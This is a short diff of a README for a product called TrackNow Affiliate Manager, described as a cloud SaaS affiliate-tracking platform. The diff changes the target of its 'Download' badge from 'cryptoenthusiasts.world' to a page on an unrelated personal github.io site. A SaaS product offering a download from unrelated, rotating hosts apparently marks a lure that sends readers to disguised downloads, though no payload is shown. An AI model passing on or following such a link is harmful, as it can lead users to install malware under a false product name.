@@ -2,7 +2,7 @@
 
 TrackNow Affiliate Manager is a cloud-based affiliate tracking solution ideal for businesses in e-Commerce, iGaming, fintech, influencers, prop trading, and affiliate networks. SaaS platform with a powerful dashboard, intuitive campaign setup, robust fraud protection, and flexible commission models including CPA, CPS, recurring, and hybrid payouts.
 
-[![Download TrackNow Affiliate Manager](https://img.shields.io/badge/Download-TrackNow_Affiliate_Manager-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download TrackNow Affiliate Manager](https://img.shields.io/badge/Download-TrackNow_Affiliate_Manager-blueviolet)](https://makairamseydrpj.github.io/.github/TrackNow)
 
 ---
 
